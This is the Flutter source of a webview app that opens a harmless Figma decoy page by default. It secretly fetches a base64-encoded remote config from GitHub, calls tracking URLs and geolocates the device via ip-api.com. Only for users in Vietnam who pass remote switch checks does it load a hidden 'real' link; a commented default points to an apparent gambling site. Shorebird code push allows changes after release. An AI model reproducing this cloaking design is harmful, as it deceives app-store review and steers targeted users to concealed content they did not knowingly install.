import 'dart:convert';
import 'dart:io';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:http/http.dart' as http;
import 'package:package_info_plus/package_info_plus.dart';
import 'package:shorebird_code_push/shorebird_code_push.dart';
import 'package:url_launcher/url_launcher.dart';

import 'notification_service.dart';


void main() async {
  WidgetsFlutterBinding.ensureInitialized();

  String? fcmToken = await NotificationService.init();

  runApp(
     MaterialApp(debugShowCheckedModeBanner: false, home: SplashScreen(fcmToken: fcmToken)),
  );
}

class SplashScreen extends StatefulWidget {
  String? fcmToken;
  SplashScreen({super.key, required this.fcmToken});

  @override
  State<SplashScreen> createState() => _SplashScreenState();
}

class _SplashScreenState extends State<SplashScreen> {
  static String defaultUri = "https://civic-nacre-61728467.figma.site";
  // String defaultUri = "https://five88.com/?a=f5d826eba333836a174307f6834c629f&utm_campaign=facebookads&utm_source=inhouse&utm_medium=webview&utm_term=ios";
  String? uri;
  String configLink = "";


  @override
  void initState() {
    super.initState();
    // if(widget.fcmToken != null){
    //   ScaffoldMessenger.of(context).showSnackBar(
    //     SnackBar(
    //       backgroundColor: Colors.green,
    //       content: InkWell(
    //           onTap: (){
    //             Clipboard.setData(ClipboardData(text: widget.fcmToken!));
    //           },
    //           child: Text("FCM Token: ${widget.fcmToken}")),
    //     ),
    //   );
    // }else{
    //   ScaffoldMessenger.of(context).showSnackBar(
    //     SnackBar(
    //       backgroundColor: Colors.red,
    //       content: Text("FCM Token is null"),
    //     ),
    //   );
    // }
    checkInternetAndNavigate();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: Container(
        width: MediaQuery.of(context).size.width,
        height: MediaQuery.of(context).size.height,
        decoration: BoxDecoration(
          gradient: LinearGradient(
            colors: [Colors.lightBlueAccent, Colors.purpleAccent],
            begin: Alignment.topLeft,
            end: Alignment.bottomRight,
          ),
        ),
        child: Center(
          child:CircularProgressIndicator(color: Colors.white),
        ),
      ),
    );
  }

  Future<void> checkInternetAndNavigate() async {
    final info = await PackageInfo.fromPlatform();
    configLink = "https://raw.githubusercontent.com/blaneee/helloworld/refs/heads/main/${info.packageName}/webview.ini";
    print("config link: " + configLink);

    bool online = await hasInternet();

    if (online) {
      loadConfigAndNavigate();
    } else {
      ScaffoldMessenger.of(context).showSnackBar(
        const SnackBar(
          backgroundColor: Colors.red,
          content: Text(
            "No Internet!",
            style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold),
          ),
        ),
      );
    }
  }

  Future<bool> hasInternet() async {
    try {
      final result = await InternetAddress.lookup('google.com');
      if (result.isNotEmpty && result[0].rawAddress.isNotEmpty) {
        return true; // Có Internet
      }
      return false;
    } on SocketException catch (_) {
      return false; // Không có Internet
    }
  }

  void loadConfigAndNavigate() async {
    try {
      // B1: Fetch Base64 config
      final res = await http.get(Uri.parse(configLink));
      if (res.statusCode != 200) throw Exception("Config fetch failed");

      // B2: Decode Base64 → UTF-8
      final decodedData = utf8.decode(base64Decode(cleanBase64(res.body)));

      // B3: Parse JSON
      final jsonData = json.decode(decodedData);
      final String? linkApp = jsonData["linkApp"];
      final String? linkReal = jsonData["linkReal"];
      final List configLDP = jsonData["configLDP"] ?? [];
      final List tracking = jsonData["tracking"] ?? [];
      final bool isCheckAll = jsonData["isCheckAll"] ?? false;
      final bool isExistKey = jsonData["isExistKey"] ?? false;
      final bool isExistValue = jsonData["isExistValue"] ?? false;
      final Map switchApp =
          jsonData["switchApp"] ?? {"key": "null", "value": null};

      // B4: Tracking call
      for (var url in tracking) {
        try {
          final trackRes = await http.get(Uri.parse(url));
          print("Data Tracking: ${trackRes.body}");
        } catch (e) {
          print("Tracking error $e");
        }
      }

      // B5: Check configLDP
      if (configLDP.isNotEmpty) {
        for (var url in configLDP) {
          try {
            final dataRes = await http.get(Uri.parse(url));
            if (dataRes.statusCode == 200) {
              final data = json.decode(dataRes.body);

              if (isCheckAll) {
                if (data[switchApp["key"]].toString() == switchApp["value"]) {
                  uri = linkReal ?? defaultUri;
                  print(uri);
                } else {
                  uri = defaultUri;
                }
              } else if (isExistKey) {
                if (data.containsKey(switchApp["key"])) {
                  uri = linkReal ?? defaultUri;
                } else {
                  uri = defaultUri;
                }
              } else if (isExistValue) {
                if (data == switchApp["value"]) {
                  uri = linkReal ?? defaultUri;
                } else {
                  uri = defaultUri;
                }
              } else {
                uri = defaultUri;
              }
              print("Data from API: $data");
            }
          } catch (e) {
            print("Error calling API: $e");
          }
        }
      } else {
        print("configLDP is empty");
      }

      //check vietnam region
      final checkRegionRes = await http.get(Uri.parse("http://ip-api.com/json/"));
      final data = jsonDecode(checkRegionRes.body);

      if(data["countryCode"] != null && data["countryCode"] != "VN"){
        uri = defaultUri;
      }


      Navigator.pushReplacement(
        context,
        MaterialPageRoute(builder: (_) => HomeScreen(uri: uri!)),
      );
    } catch (e) {
      print("Error: $e");
      Navigator.pushReplacement(
        context,
        MaterialPageRoute(builder: (_) => HomeScreen(uri: defaultUri)),
      );
    }
  }

  String cleanBase64(String input) {
    String cleaned = input.replaceAll("\n", "").replaceAll("\r", "").trim();
    while (cleaned.length % 4 != 0) {
      cleaned += "=";
    }
    return cleaned;
  }

}

class HomeScreen extends StatefulWidget {
  String uri;

  HomeScreen({super.key, required this.uri});

  @override
  State<HomeScreen> createState() => _HomeScreenState();
}

class _HomeScreenState extends State<HomeScreen> {
  String get uri => widget.uri;
  late final InAppWebViewController controller;
  bool _showMenu = false;
  double posX = 25;
  double posY = 650;
  double x = 50.0;
  double y= 50.0;

  String lastPopupUrl = "";

  @override
  void initState() {
    super.initState();
    // TODO: implement initState
    SystemChrome.setEnabledSystemUIMode(SystemUiMode.immersiveSticky);
    checkUpdate();

  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.white,
      body: SafeArea(
        bottom: false,
        child: Stack(
          children: [
            // WebViewWidget(controller: controller),
            Padding(
              padding: EdgeInsets.only(bottom: 0),
              child: InAppWebView(
                initialUrlRequest: URLRequest(url: WebUri(uri)),
                initialSettings: InAppWebViewSettings(
                  javaScriptEnabled: true,
                  mediaPlaybackRequiresUserGesture: true,
                  isFraudulentWebsiteWarningEnabled: true,
                  allowsInlineMediaPlayback: true,
                  allowsPictureInPictureMediaPlayback: false,
                ),
                onWebViewCreated: (controller) {
                  this.controller = controller;
                },
                shouldOverrideUrlLoading: (controller, navigationAction) async {
                  final url = navigationAction.request.url.toString();
                  if (url.startsWith("tg://") || url.contains("t.me")) {
                    await launchUrl(
                      Uri.parse(url),
                      mode: LaunchMode.externalApplication,
                    );
                    return NavigationActionPolicy.CANCEL; // chặn webview load URL này
                  }
                  // Nếu link này được mở bởi onCreateWindow thì KHÔNG xử lý lại ở đây
                  if (navigationAction.isForMainFrame == false) {
                    return NavigationActionPolicy.CANCEL;
                  }
                  return NavigationActionPolicy.ALLOW;
                },
                onCreateWindow: (controller, createWindowRequest) async {

                  final url = createWindowRequest.request.url.toString();
                  print("SENTRY: $url");

                  // Nếu là link Telegram → mở ngoài app và chặn
                  if (url.startsWith("tg://") || url.contains("t.me")) {
                    await launchUrl(
                      Uri.parse(url),
                      mode: LaunchMode.externalApplication,
                    );
                    return false; // KHÔNG tạo popup, KHÔNG load trong webview
                  }
                  Navigator.push(
                    context,
                    MaterialPageRoute(
                      builder: (_) => PopUpWebView(
                        createWindowRequest: createWindowRequest,
                        onPopupUrlLoaded: (realUrl) {
                          if (isSameGame(lastPopupUrl, realUrl)) {
                            print("⛔ Duplicate popup bị chặn: $realUrl");
                            Navigator.pop(context); // đóng cái popup duplicate
                          } else {
                            lastPopupUrl = realUrl;
                          }
                        },
                        onClosed: () {
                          lastPopupUrl = ""; // reset khi đóng
                        },
                      ),
                    ),
                  );
                  return true;
                },

              ),
            ),
            // Floating Assistive Button
            Visibility(
              visible: !uri.contains("figma"),
              // visible: true,
              child: Positioned(
                left: posX,
                top: posY,
                child: GestureDetector(
                  onPanUpdate: (details) {
                    setState(() {
                      posX += details.delta.dx;
                      posY += details.delta.dy;
                    });
                  },
                  child: Row(
                    children: [
                      // Nút chính
                      FloatingActionButton(
                        mini: true,
                        backgroundColor: Colors.white.withOpacity(0.2),
                        child: Icon(_showMenu ? Icons.close : Icons.arrow_forward_ios_outlined, size: 20, color: Colors.black54,),
                        onPressed: () {
                          setState(() {
                            _showMenu = !_showMenu;
                          });
                        },

                      ),

                      // Menu con
                      if (_showMenu)
                        Container(
                          margin: const EdgeInsets.only(top: 8),
                          decoration: BoxDecoration(
                            color: Colors.black.withOpacity(0.7),
                            borderRadius: BorderRadius.circular(12),
                          ),
                          child: Row(
                            children: [
                              IconButton(
                                icon: const Icon(Icons.arrow_back, color: Colors.white),
                                onPressed: () async {
                                  if (await controller.canGoBack()) {
                                    controller.goBack();
                                  }
                                },
                              ),
                              IconButton(
                                icon: const Icon(Icons.arrow_forward, color: Colors.white),
                                onPressed: () async {
                                  if (await controller.canGoForward()) {
                                    controller.goForward();
                                  }
                                },
                              ),
                              IconButton(
                                icon: const Icon(Icons.refresh, color: Colors.white),
                                onPressed: () {
                                  controller.reload();
                                },
                              ),
                              IconButton(
                                icon: const Icon(Icons.home, color: Colors.white),
                                onPressed: () {
                                  controller.loadUrl(urlRequest: URLRequest(url: WebUri(uri)));
                                },
                              ),
                            ],
                          ),
                        ),
                    ],
                  ),
                ),
              ),
            ),
          ],
        )

        // child: Center(
        //   child: Text("HOT UPDATE!"),
        // ),

      ),
    );
  }

  bool isSameGame(String url1, String url2) {
    final uri1 = Uri.parse(url1);
    final uri2 = Uri.parse(url2);

    // So sánh domain + path, bỏ qua query string
    if (uri1.scheme == uri2.scheme &&
        uri1.host == uri2.host &&
        uri1.path == uri2.path) {
      return true;
    }
    return false;
  }
  Future<void> checkUpdate() async {
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(
        backgroundColor: Colors.orange,
        content: Text("Checking for updates..."),
      ),
    );
    final updater = ShorebirdUpdater();
    bool isUpdateAvailable = await updater.checkForUpdate() == UpdateStatus.outdated;
    if(isUpdateAvailable) {
      ScaffoldMessenger.of(context).showSnackBar(
        SnackBar(
          backgroundColor: Colors.orange,
          content: Text("Update available, downloading..."),
        ),
      );
      _waitForUpdate(updater);
    }else{
      ScaffoldMessenger.of(context).showSnackBar(
        SnackBar(
          backgroundColor: Colors.green,
          content: Text("App is up to date."),
        ),
      );
    }
  }
  Future<void> _waitForUpdate(ShorebirdUpdater updater) async {
    while (true) {
      await Future.delayed(const Duration(seconds: 1));
      final status = await updater.checkForUpdate();
      if (status == UpdateStatus.restartRequired) {
        // Đã tải xong patch, yêu cầu user restart app
        ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(
            backgroundColor: Colors.green,
            content: const Text("Update downloaded. Please restart app."),
            action: SnackBarAction(
              label: "Restart",
              textColor: Colors.white,
              onPressed: () {
                exit(0);
                // restart app (cần custom cách, VD: exit(0) hoặc gợi ý user tự restart)
              },
            ),
          ),
        );
        break;
      }
    }
  }


}




class PopUpWebView extends StatefulWidget {
  final CreateWindowAction createWindowRequest;
  final void Function(String url)? onPopupUrlLoaded;
  final VoidCallback? onClosed;

  const PopUpWebView({
    super.key,
    required this.createWindowRequest,
    this.onPopupUrlLoaded,
    this.onClosed,
  });

  @override
  State<PopUpWebView> createState() => _PopupWebViewState();
}

class _PopupWebViewState extends State<PopUpWebView> {
  double popupX = 0;
  double popupY = 50;

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: SafeArea(
        child: Stack(
          children: [
            InAppWebView(
              windowId: widget.createWindowRequest.windowId,
              initialSettings: InAppWebViewSettings(
                mediaPlaybackRequiresUserGesture: true, // 👈 bắt buộc user phải bấm mới play video
                javaScriptEnabled: true,
              ),
              onLoadStart: (controller, url) {
                final realUrl = url.toString();
                print("Popup URL: $realUrl");
                widget.onPopupUrlLoaded?.call(realUrl);
              },
            ),
            Positioned(
              left: popupX,
              top: popupY,
              child: GestureDetector(
                onPanUpdate: (details) {
                  setState(() {
                    popupX += details.delta.dx;
                    popupY += details.delta.dy;
                  });
                },
                child: FloatingActionButton(
                  mini: true,
                  backgroundColor: Colors.white,
                  child: const Icon(Icons.arrow_back_ios_outlined,
                      size: 20, color: Colors.black54),
                  onPressed: () {
                    widget.onClosed?.call();
                    Navigator.pop(context);},
                ),
              ),
            )
          ],
        ),
      ),
    );
  }
}

